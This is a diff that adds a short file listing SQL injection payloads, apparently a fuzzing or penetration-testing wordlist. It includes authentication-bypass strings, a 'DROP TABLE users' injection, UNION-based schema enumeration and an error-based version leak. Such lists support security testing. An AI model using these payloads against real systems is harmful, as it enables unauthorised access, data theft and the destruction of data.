@@ -1,0 +1,20 @@
+'
+" OR 1=1 --
+') OR ('1'='1
+admin' --
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 #
+" OR 1=1 #
+or 1=1--
+' OR 'x'='x
+" OR "x"="x
+'--
+'; DROP TABLE users; --
+1' AND 1=1 #
+' AND 1=1 #
+' GROUP BY 1,2,3 --
+' GROUP BY columnnames having 1=1 --
+' UNION SELECT 1,2,3 --
+' UNION ALL SELECT 1,2,3,4,5,6 FROM information_schema.tables --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y) --
